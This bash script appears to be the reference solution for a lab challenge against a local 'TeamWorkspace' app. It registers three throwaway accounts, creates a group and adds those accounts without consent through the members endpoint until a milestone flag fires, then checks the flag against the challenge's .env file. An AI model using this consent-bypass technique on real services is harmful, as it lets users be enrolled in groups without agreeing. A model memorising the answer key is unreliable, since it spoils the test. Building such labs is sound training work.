#!/usr/bin/env bash
# ============================================================
# TeamWorkspace (labs18) — reference solution: membership
# without consent
#
# Chain: register three disposable accounts -> log in as the
# first -> create an own group -> add the three OWN accounts
# until the group reaches 3 members and the milestone flag
# fires. Pre-existing seeded users are never targeted.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8098)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8098}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
suffix="$(date +%s)-$RANDOM"

echo "[*] registering three disposable accounts" >&2
for u in a b c; do
  curl -fsS -o /dev/null -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
    -d "{\"username\":\"test-$suffix-$u\",\"password\":\"test123\"}"
done

echo "[*] logging in and creating an own group" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/login" -H 'Content-Type: application/json' \
  -d "{\"username\":\"test-$suffix-a\",\"password\":\"test123\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: login returned no token" >&2; exit 1; }
GID="$(curl -fsS -X POST "$BASE/api/groups" -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d "{\"name\":\"test-group-$suffix\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("group_id",""))')"
[[ -n "$GID" ]] || { echo "[-] failed: group creation returned no id" >&2; exit 1; }

echo "[*] adding the own accounts until the milestone fires" >&2
USERS_JSON="$(curl -fsS "$BASE/api/users" -H "Authorization: Bearer $TOKEN")"
IDS="$(python3 - "$USERS_JSON" "$suffix" <<'PY'
import json, sys
users = json.loads(sys.argv[1])
print("\n".join(str(u["id"]) for u in users if str(u["username"]).startswith(f"test-{sys.argv[2]}-")))
PY
)"
flag=""
while IFS= read -r uid; do
  [[ -z "$uid" ]] && continue
  RESP="$(curl -fsS -X POST "$BASE/api/groups/$GID/members" \
    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d "{\"user_id\":$uid}")"
  flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("milestone",""))' <<<"$RESP")"
  [[ -n "$flag" ]] && break
done <<<"$IDS"

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: milestone never fired (expected at 3 own members)" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
